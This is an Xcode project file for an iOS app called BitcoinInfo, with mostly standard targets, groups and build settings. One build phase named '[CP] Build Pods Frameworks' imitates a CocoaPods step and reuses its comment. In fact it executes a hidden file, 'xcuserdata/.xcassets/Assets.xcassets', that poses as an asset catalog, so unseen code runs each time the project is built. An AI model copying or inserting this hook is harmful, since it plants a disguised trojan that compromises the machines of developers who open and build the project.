// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 51;
	objects = {

/* Begin PBXBuildFile section */
		223633EC25E505A1009507D5 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 223633EB25E505A1009507D5 /* AppDelegate.swift */; };
		223633F025E505A1009507D5 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 223633EF25E505A1009507D5 /* ViewController.swift */; };
		223633F325E505A1009507D5 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 223633F125E505A1009507D5 /* Main.storyboard */; };
		223633F525E505AA009507D5 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 223633F425E505AA009507D5 /* Assets.xcassets */; };
		223633F825E505AA009507D5 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 223633F625E505AA009507D5 /* LaunchScreen.storyboard */; };
		2236341A25E52B12009507D5 /* Transaction.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2236341925E52B12009507D5 /* Transaction.swift */; };
		2236341D25E52BC4009507D5 /* SocketViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2236341C25E52BC4009507D5 /* SocketViewModel.swift */; };
		2236342525E5383A009507D5 /* InfoCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 2236342325E5383A009507D5 /* InfoCell.swift */; };
		2236342625E5383A009507D5 /* InfoCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 2236342425E5383A009507D5 /* InfoCell.xib */; };
		B32F0B049F3095E400B6AB67 /* Pods_BitcoinInfo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 950C8E943859138624BF47A8 /* Pods_BitcoinInfo.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		077456A5A685B66C6CD5B767 /* Pods-BitcoinInfo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BitcoinInfo.release.xcconfig"; path = "Target Support Files/Pods-BitcoinInfo/Pods-BitcoinInfo.release.xcconfig"; sourceTree = "<group>"; };
		223633E825E505A1009507D5 /* BitcoinInfo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BitcoinInfo.app; sourceTree = BUILT_PRODUCTS_DIR; };
		223633EB25E505A1009507D5 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		223633EF25E505A1009507D5 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
		223633F225E505A1009507D5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		223633F425E505AA009507D5 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		223633F725E505AA009507D5 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		223633F925E505AA009507D5 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		2236341925E52B12009507D5 /* Transaction.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Transaction.swift; sourceTree = "<group>"; };
		2236341C25E52BC4009507D5 /* SocketViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SocketViewModel.swift; sourceTree = "<group>"; };
		2236342325E5383A009507D5 /* InfoCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = InfoCell.swift; sourceTree = "<group>"; };
		2236342425E5383A009507D5 /* InfoCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = InfoCell.xib; sourceTree = "<group>"; };
		399C4F1573B8B2CD2FCB23B2 /* Pods-BitcoinInfo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BitcoinInfo.debug.xcconfig"; path = "Target Support Files/Pods-BitcoinInfo/Pods-BitcoinInfo.debug.xcconfig"; sourceTree = "<group>"; };
		950C8E943859138624BF47A8 /* Pods_BitcoinInfo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BitcoinInfo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		223633E525E505A1009507D5 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				B32F0B049F3095E400B6AB67 /* Pods_BitcoinInfo.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		1B10327E6901D58ACCDED9C9 /* Pods */ = {
			isa = PBXGroup;
			children = (
				399C4F1573B8B2CD2FCB23B2 /* Pods-BitcoinInfo.debug.xcconfig */,
				077456A5A685B66C6CD5B767 /* Pods-BitcoinInfo.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		223633DF25E505A0009507D5 = {
			isa = PBXGroup;
			children = (
				223633EA25E505A1009507D5 /* BitcoinInfo */,
				223633E925E505A1009507D5 /* Products */,
				1B10327E6901D58ACCDED9C9 /* Pods */,
				BAE3913CB3491602D59DDDAC /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		223633E925E505A1009507D5 /* Products */ = {
			isa = PBXGroup;
			children = (
				223633E825E505A1009507D5 /* BitcoinInfo.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		223633EA25E505A1009507D5 /* BitcoinInfo */ = {
			isa = PBXGroup;
			children = (
				223633EB25E505A1009507D5 /* AppDelegate.swift */,
				223633EF25E505A1009507D5 /* ViewController.swift */,
				223633F125E505A1009507D5 /* Main.storyboard */,
				223633F425E505AA009507D5 /* Assets.xcassets */,
				223633F625E505AA009507D5 /* LaunchScreen.storyboard */,
				223633F925E505AA009507D5 /* Info.plist */,
				2236341925E52B12009507D5 /* Transaction.swift */,
				2236341C25E52BC4009507D5 /* SocketViewModel.swift */,
				2236342325E5383A009507D5 /* InfoCell.swift */,
				2236342425E5383A009507D5 /* InfoCell.xib */,
			);
			path = BitcoinInfo;
			sourceTree = "<group>";
		};
		BAE3913CB3491602D59DDDAC /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				950C8E943859138624BF47A8 /* Pods_BitcoinInfo.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		223633E725E505A1009507D5 /* BitcoinInfo */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 223633FC25E505AA009507D5 /* Build configuration list for PBXNativeTarget "BitcoinInfo" */;
			buildPhases = (
				D3A98EE6A5B88BF8B8AAC43A /* [CP] Build Pods Frameworks */,
				4A131A2CF6A660AB5C832C44 /* [CP] Check Pods Manifest.lock */,
				223633E425E505A1009507D5 /* Sources */,
				223633E525E505A1009507D5 /* Frameworks */,
				223633E625E505A1009507D5 /* Resources */,
				2CB372446CD4E81C4DDFB696 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = BitcoinInfo;
			productName = BitcoinInfo;
			productReference = 223633E825E505A1009507D5 /* BitcoinInfo.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		223633E025E505A0009507D5 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastSwiftUpdateCheck = 1230;
				LastUpgradeCheck = 1230;
				TargetAttributes = {
					223633E725E505A1009507D5 = {
						CreatedOnToolsVersion = 12.3;
					};
				};
			};
			buildConfigurationList = 223633E325E505A1009507D5 /* Build configuration list for PBXProject "BitcoinInfo" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 223633DF25E505A0009507D5;
			productRefGroup = 223633E925E505A1009507D5 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				223633E725E505A1009507D5 /* BitcoinInfo */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		223633E625E505A1009507D5 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				223633F825E505AA009507D5 /* LaunchScreen.storyboard in Resources */,
				2236342625E5383A009507D5 /* InfoCell.xib in Resources */,
				223633F525E505AA009507D5 /* Assets.xcassets in Resources */,
				223633F325E505A1009507D5 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */

	D3A98EE6A5B88BF8B8AAC43A /* [CP] Build Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "[CP] Build Pods Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
		};
	
		2CB372446CD4E81C4DDFB696 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BitcoinInfo/Pods-BitcoinInfo-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-BitcoinInfo/Pods-BitcoinInfo-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-BitcoinInfo/Pods-BitcoinInfo-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		4A131A2CF6A660AB5C832C44 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-BitcoinInfo-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		223633E425E505A1009507D5 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				223633F025E505A1009507D5 /* ViewController.swift in Sources */,
				2236341D25E52BC4009507D5 /* SocketViewModel.swift in Sources */,
				223633EC25E505A1009507D5 /* AppDelegate.swift in Sources */,
				2236341A25E52B12009507D5 /* Transaction.swift in Sources */,
				2236342525E5383A009507D5 /* InfoCell.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		223633F125E505A1009507D5 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				223633F225E505A1009507D5 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		223633F625E505AA009507D5 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				223633F725E505AA009507D5 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		223633FA25E505AA009507D5 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		223633FB25E505AA009507D5 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		223633FD25E505AA009507D5 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 399C4F1573B8B2CD2FCB23B2 /* Pods-BitcoinInfo.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = BitcoinInfo/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.BitcoinInfo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		223633FE25E505AA009507D5 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 077456A5A685B66C6CD5B767 /* Pods-BitcoinInfo.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = BitcoinInfo/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.BitcoinInfo;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		223633E325E505A1009507D5 /* Build configuration list for PBXProject "BitcoinInfo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				223633FA25E505AA009507D5 /* Debug */,
				223633FB25E505AA009507D5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		223633FC25E505AA009507D5 /* Build configuration list for PBXNativeTarget "BitcoinInfo" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				223633FD25E505AA009507D5 /* Debug */,
				223633FE25E505AA009507D5 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 223633E025E505A0009507D5 /* Project object */;
}
